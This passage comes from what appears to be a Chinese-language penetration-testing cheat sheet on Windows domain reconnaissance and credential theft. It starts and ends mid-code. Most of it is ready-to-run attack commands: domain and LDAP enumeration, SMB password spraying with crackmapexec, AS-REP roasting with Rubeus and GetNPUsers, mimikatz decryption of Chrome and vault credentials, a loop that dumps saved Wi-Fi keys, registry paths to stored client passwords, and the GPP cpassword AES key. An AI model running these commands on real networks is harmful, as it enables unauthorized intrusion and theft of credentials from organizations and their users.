TimeCreated[timediff(@SystemTime) &lt;= 2592000000]]]&quot;</span> /<span class="hljs-built_in">r</span>:域控IP /u:域管 /p:域管密码<br></code></pre></td></tr></table></figure><h4 id="浏览器日志"><a href="#浏览器日志" class="headerlink" title="浏览器日志"></a>浏览器日志</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#chrome</span><br>C:\Users<span class="hljs-variable">$username</span>\AppData\Local\Google\Chrome\User Data\Default\History   <br><br><span class="hljs-comment">#IE</span><br>reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs&quot;</span> C:\Users<span class="hljs-variable">$user</span>\AppData\Local\Microsoft\Windows\History<br><br><span class="hljs-comment">#edge, v79+</span><br>C:\Users<span class="hljs-variable">$user</span>\AppData\Local\Microsoft\Edge\User Data\Default\History<br><br><span class="hljs-comment">#edge, v44+:</span><br>C:\Users<span class="hljs-variable">$user</span>\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat<br></code></pre></td></tr></table></figure><p>浏览器的历史记录文件 history，是使用 sqlite 格式记录的，直接打开是一个二进制文件，可以下载到本地破解，或者直接替换查看。</p><p>此外，edge v44+ 版本的历史记录文件在用户登录状态下是锁定的。</p><h4 id="DNS-服务器记录"><a href="#DNS-服务器记录" class="headerlink" title="DNS 服务器记录"></a>DNS 服务器记录</h4><blockquote><p>一般在域环境中都会有一台 DNS 服务器，小企业或内网环境较小的可能会和域控为同一台，大一些的企业，多为独立的 DNS 服务器。</p><p>由于 DNS 服务器的特性，在 DNS 服务器上会存在大量内网地址解析记录，如果可以获取，会极大的方便内网拓扑展开，同时很多其他主机无法到达的地址，DNS 服务器是可以到达的。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">dnscmd . /EnumZones   <span class="hljs-comment">#列出DNS 服务器上的所有区域（zones）</span><br>dnscmd . /ZoneInfo test.com  <span class="hljs-comment">#列出 test.com 中的详细记录</span><br>dnscmd . /EnumRecords test.com  <span class="hljs-comment">#列出 test.com 中的记录</span><br></code></pre></td></tr></table></figure><p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p><blockquote><p>nslookup -type=all_ldap._tcp.dc.greyfinger.com </p><p>nslookup -type=ns domain.com </p><p>cmd&gt; nslookup server dns.domain.com ls domain.com</p></blockquote><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><h4 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net config workstation                    <span class="hljs-comment"># 显示当前工作站的配置，包括计算机的名称、工作站域、软件版本、工作站域的登录服务器名等</span><br>net time /domain                          <span class="hljs-comment"># 同步时间，通常为域控服务器</span><br>net accounts /domain                      <span class="hljs-comment"># 查询域密码策略</span><br>net user /domain                          <span class="hljs-comment"># 列出当前域成员列表</span><br>net user username /domain                 <span class="hljs-comment"># 列出域成员详细信息</span><br>net <span class="hljs-built_in">group</span> /domain                         <span class="hljs-comment"># 列出域内组列表</span><br>net <span class="hljs-built_in">group</span> groupname /domain               <span class="hljs-comment"># 列出域内组成员列表</span><br>net localgroup administrators /domain  <span class="hljs-comment"># 列出域控上的管理员</span><br>net <span class="hljs-built_in">group</span> Domain<span class="hljs-string">&quot; &quot;</span>Admins /domain  <span class="hljs-comment"># 列出域全局管理员</span><br>net view                                  <span class="hljs-comment"># 查询同一域内机器列表</span><br>net view /domain                          <span class="hljs-comment"># 查询域列表</span><br>net view /domain:test                     <span class="hljs-comment"># 查询 test 域中计算机列表</span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain controllers&quot;</span> /domain    <span class="hljs-comment"># 查询域内的所有DC</span><br>nltest /dclist:域名                        <span class="hljs-comment"># 查询域内的所有DC及相关状态信息</span><br>nltest /dsgetdc:域名                       <span class="hljs-comment"># 拿到DC当前的认证信息</span><br>nltest /domain_trusts                     <span class="hljs-comment"># 查询域信任信息</span><br>nltest /user:<span class="hljs-string">&quot;username&quot;</span>                   <span class="hljs-comment"># 得到用户信息</span><br></code></pre></td></tr></table></figure><h4 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery"></a>dsquery</h4><p><code>dsquery </code>命令很少使用，而且限制较大仅能在域控上执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">dsquery computer                          <span class="hljs-comment"># 查询目录中的计算机s</span><br>dsquery computer domainroot <span class="hljs-literal">-limit</span> <span class="hljs-number">65535</span>  <span class="hljs-comment"># 列出该域内所有机器名</span><br>dsquery contact                           <span class="hljs-comment"># 查询目录中的联系人</span><br>dsquery server  <span class="hljs-comment"># 列出域控</span><br>dsquery subnet                            <span class="hljs-comment"># 查询目录中的子网</span><br>dsquery <span class="hljs-built_in">group</span>                             <span class="hljs-comment"># 查询目录中的组</span><br>dsquery site                              <span class="hljs-comment"># 查询目录中的站点</span><br>dsquery user                              <span class="hljs-comment"># 查询目录中的用户</span><br>dsquery ou  <span class="hljs-comment"># 列出域内组织单位</span><br></code></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取所有AD用户</span><br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> *<br><span class="hljs-comment"># 查询当前Domain信息</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-comment"># 查询域信任关系</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships()<br><span class="hljs-comment"># 查询当前林信息</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetCurrentForest()<br><span class="hljs-comment"># 查询林信任信息</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetForest((<span class="hljs-built_in">New-Object</span> System.DirectoryServices.ActiveDirectory.DirectoryContext(<span class="hljs-string">&#x27;Forest&#x27;</span>, <span class="hljs-string">&#x27;forest-of-interest.local&#x27;</span>)))).GetAllTrustRelationships()<br></code></pre></td></tr></table></figure><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出可匿名访问的smb共享</span><br>enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;<br>smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;<br>smbclient -U &#x27;%&#x27; -L //&lt;dc-ip&gt; &amp;&amp; smbclient -U &#x27;guest%&#x27; -L //&lt;dc-ip&gt;<br>crackmapexec smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; # 枚举可空Session访问的SMB共享<br>crackmapexec smb &lt;ip&gt; -u &#x27;a&#x27; -p &#x27;&#x27; #枚举可匿名访问的SMB共享<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取域密码策略</span><br>crackmapexec &lt;IP&gt; -u &#x27;user&#x27; -p &#x27;password&#x27; --pass-pol#查询目标主机的密码策略<br>enum4linx -u &#x27;username&#x27; -p &#x27;password&#x27; -P &lt;IP&gt;#使用指定的凭据枚举目标主机的 SMB 服务信息<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">密码喷洒</span><br>crackmapexec smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce# 一一对应<br>crackmapexec smb &lt;dc-ip&gt; -u user.txt -p password.txt# 交叉爆破<br></code></pre></td></tr></table></figure><h4 id="枚举LDAP"><a href="#枚举LDAP" class="headerlink" title="枚举LDAP"></a>枚举LDAP</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;<br>ldapsearch -x -h &lt;ip&gt; -s base<br></code></pre></td></tr></table></figure><h4 id="查找用户名"><a href="#查找用户名" class="headerlink" title="查找用户名"></a>查找用户名</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">enum4linux -U &lt;dc-ip&gt; | grep &#x27;user:&#x27;# 列举 SMB 服务中的用户，需要可匿名访问smb<br>crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --users# 列出域中的用户<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Nmap 的 krb5-enum-users 脚本枚举 Kerberos 服务中的用户 (爆破用户名)</span><br>nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;&lt;domain&gt;&#x27;,userdb=&lt;users_list_file&gt;&quot; &lt;ip&gt;<br></code></pre></td></tr></table></figure><h4 id="ASREP-Roasting"><a href="#ASREP-Roasting" class="headerlink" title="ASREP-Roasting"></a>ASREP-Roasting</h4><p>获取ASREP-Roastable账号（即可用攻击目标）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span> <span class="hljs-literal">-Properties</span> SamAccountName<br><br>MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p=shortestPath((u)-[*<span class="hljs-number">1</span><span class="hljs-type">..</span>]-&gt;(c)) <span class="hljs-keyword">RETURN</span> p<br></code></pre></td></tr></table></figure><p>获取hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将所有成功获取的AS-REP哈希保存到 hashes.corp.local.txt 文件中</span><br>python GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取所有符合条件的用户AS-REP哈希，并打印到屏幕</span><br>Rubeus asreproast /format:hashcat<br></code></pre></td></tr></table></figure><h4 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a>枚举 DNS 服务器</h4><p>需要控制一个域用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">dnstool.py <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;DOMAIN\user&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-literal">--record</span> <span class="hljs-string">&#x27;*&#x27;</span> <span class="hljs-literal">--action</span> query &lt;dc_ip&gt;<br></code></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%windir%\system32\inetsrv\config\applicationHost.config     <span class="hljs-comment">#IIS 配置文件路径</span><br>%windir%\system32\inetsrv\appcmd list site /config     <span class="hljs-comment">#显示IIS 配置信息</span><br>%windir%\system32\inetsrv\appcmd list site /config /xml &gt; c:\sites.xml   <span class="hljs-comment">#以XML格式输出</span><br></code></pre></td></tr></table></figure><h3 id="密码-凭据搜集"><a href="#密码-凭据搜集" class="headerlink" title="密码/凭据搜集"></a>密码/凭据搜集</h3><p><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p><p><a href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></p><p><a href="https://github.com/giMini/mimiDbg">mimiDbg</a></p><p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p><p>NirLauncher</p><p><a href="https://github.com/quarkslab/quarkspwdump">quarkspwdump:</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmdkey /list    <span class="hljs-comment">#列出远程连接凭据</span><br><br><span class="hljs-comment">#域用户登录脚本存在目录也会存在敏感文件：</span><br>\domain\Netlogon<br><br>runas /savecred /user:admin cmd.exe<span class="hljs-comment">#以 admin 用户的身份启动一个新的cmd如果这个命令被运行过，则不需密码。</span><br></code></pre></td></tr></table></figure><h5 id="windows批量安装设置"><a href="#windows批量安装设置" class="headerlink" title="windows批量安装设置"></a>windows批量安装设置</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">C:\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\system32\sysprep.<span class="hljs-literal">inf</span><br>C:\Windows\system32\sysprep\sysprep.xml<br></code></pre></td></tr></table></figure><p>可能会发现:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Credentials</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Domain</span>&gt;</span>thm.local<span class="hljs-tag">&lt;/<span class="hljs-name">Domain</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>MyPassword123<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Credentials</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">type</span> C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\Config\web.config | findstr connectionString<br></code></pre></td></tr></table></figure><h5 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h5><p><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">how-does-navicat-encrypt-password</a></p><p><a href="https://github.com/tianhe1986/FatSmallTools">FatSmallTools</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&quot;</span>      <span class="hljs-comment">#查询路径下各项</span><br>reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\项&quot;</span> /v <span class="hljs-built_in">pwd</span>     <span class="hljs-comment">#查看密码</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">数据库</th><th align="left">路径</th></tr></thead><tbody><tr><td align="left">MySQL</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\</td></tr><tr><td align="left">MariaDB</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\</td></tr><tr><td align="left">MongoDB</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\</td></tr><tr><td align="left">Microsoft SQL</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\</td></tr><tr><td align="left">Oracle</td><td align="left">HKEY_CURRENT_USERHKEYCURRENTUSER\Software\PremiumSoft\NavicatOra\Servers\</td></tr><tr><td align="left">PostgreSQL</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\</td></tr><tr><td align="left">SQLite</td><td align="left">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\</td></tr></tbody></table><h5 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h5><table><thead><tr><th align="left">系统版本</th><th align="left">路径</th></tr></thead><tbody><tr><td align="left">xp/win2003</td><td align="left">C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td></tr><tr><td align="left">win7/win2008以上</td><td align="left">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td></tr></tbody></table><h5 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h5><p><a href="https://github.com/dzxs/Xdecrypt">Xdecrypt</a></p><table><thead><tr><th align="left">版本</th><th align="left">路径</th></tr></thead><tbody><tr><td align="left">Xshell 5</td><td align="left">%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td align="left">Xshell 6</td><td align="left">%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr></tbody></table><h5 id="mRemoteNG"><a href="#mRemoteNG" class="headerlink" title="mRemoteNG"></a>mRemoteNG</h5><p><a href="https://github.com/kmahyyg/mremoteng-decrypt">mremoteng-decrypt</a></p><h5 id="WinSCP"><a href="#WinSCP" class="headerlink" title="WinSCP"></a>WinSCP</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKCU<span class="hljs-string">\Software\Martin</span> Prikryl<span class="hljs-string">\WinSCP</span> <span class="hljs-number">2</span><span class="hljs-string">\Sessions</span><br></code></pre></td></tr></table></figure><h5 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h5><p>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</p><table><thead><tr><th align="left">版本</th><th align="left">路径</th><th align="left">类型</th></tr></thead><tbody><tr><td align="left">RealVNC</td><td align="left">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</td><td align="left">Password</td></tr><tr><td align="left">TightVNC</td><td align="left">HKEY_CURRENT_USER\Software\TightVNC\Server Value</td><td align="left">Password or PasswordViewOnly</td></tr><tr><td align="left">TigerVNC</td><td align="left">HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td><td align="left">Password</td></tr><tr><td align="left">UltraVNC</td><td align="left">C:\Program Files\UltraVNC\ultravnc.ini</td><td align="left">passwd or passwd2</td></tr></tbody></table><h5 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h5><blockquote><p>DPAPI，由微软从Windows 2000开始发布，称为Data Protection Application Programming<br>Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数<br>CryptUnprotectData 。</p><p>其作用范围包括且不限于：</p><p>outlook客户端密码</p><p>windows credential凭据</p><p>chrome保存的密码凭据</p><p>internet explorer密码凭据</p></blockquote><p>在渗透中，可以利用mimikatz做到自动化的数据解密</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#解密Chrome密码：</span><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:”%localappdata%\Google\Chrome\User Data\Default\Login <span class="hljs-keyword">Data</span>” /unprotect<br><br><span class="hljs-comment">#解密Credential：</span><br>mimikatz vault::cred /patch<br></code></pre></td></tr></table></figure><h5 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h5><p>获取连接过的wifi密码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#<span class="hljs-built_in">cmd</span><br><span class="hljs-keyword">for</span> /f &quot;skip=<span class="hljs-number">9</span> tokens=<span class="hljs-number">1</span>,<span class="hljs-number">2</span> delims=:&quot; %i <span class="hljs-keyword">in</span> (&#x27;netsh wlan show profiles&#x27;) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> %j | <span class="hljs-built_in">findstr</span> /V &quot;<span class="hljs-built_in">echo</span>&quot; | netsh wlan show profiles %j key=clear<br><br>#powershell<br>netsh wlan show profiles | Select-String &quot;\:(.+)$&quot; | ForEach-Object &#123;$name = $_.Matches.Groups[<span class="hljs-number">1</span>].Value.Trim();$_; netsh wlan show profile name=&quot;$name&quot; key=clear &#125;<br></code></pre></td></tr></table></figure><h5 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h5><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p><p>xml文件位置：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">\\域名\sysvol\域名\policies\&#123;一串类似<span class="hljs-type">uuid</span>的东西&#125;\<span class="hljs-keyword">User</span>\Preferences\<span class="hljs-keyword">Groups</span><br></code></pre></td></tr></table></figure><p>xml文件内容示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span> <br>- <span class="hljs-tag">&lt;<span class="hljs-name">Groups</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;</span><br>- <span class="hljs-tag">&lt;<span class="hljs-name">User</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Administrator (内置)&quot;</span> <span class="hljs-attr">image</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">changed</span>=<span class="hljs-string">&quot;2017-09-25 22:57:53&quot;</span> <span class="hljs-attr">uid</span>=<span class="hljs-string">&quot;&#123;463245FF-08D3-4A28-95E7-42AB416DC508&#125;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Properties</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;U&quot;</span> <span class="hljs-attr">newName</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">fullName</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">description</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">cpassword</span>=<span class="hljs-string">&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;</span> <span class="hljs-attr">changeLogon</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">noChange</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">neverExpires</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">acctDisabled</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">subAuthority</span>=<span class="hljs-string">&quot;RID_ADMIN&quot;</span> <span class="hljs-attr">userName</span>=<span class="hljs-string">&quot;Administrator (内置)&quot;</span> /&gt;</span> <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">User</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">Groups</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中xml中的密码<code>cpassword</code>是aes加密的，密钥已被微软公开</p><p>32字节AES密钥如下:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4e</span> <span class="hljs-number">99</span> <span class="hljs-number">06</span> e8  fc b6 <span class="hljs-number">6</span>c c9  fa f4 <span class="hljs-number">93</span> <span class="hljs-number">10</span>  <span class="hljs-number">62</span> <span class="hljs-number">0</span>f fe e8<br><span class="hljs-attribute">f4</span> <span class="hljs-number">96</span> e8 <span class="hljs-number">06</span>  cc <span class="hljs-number">05</span> <span class="hljs-number">79</span> <span class="hljs-number">90</span>  <span class="hljs-number">20</span> <span class="hljs-number">9</span>b <span class="hljs-number">09</span> a4  <span class="hljs-number">33</span> b6 <span class="hljs-number">6</span>c <span class="hljs-number">1</span>b<br></code></pre></td></tr></table></figure><p>可以使用相关脚本进行解密</p><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a><br>自动寻找文件并解密</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 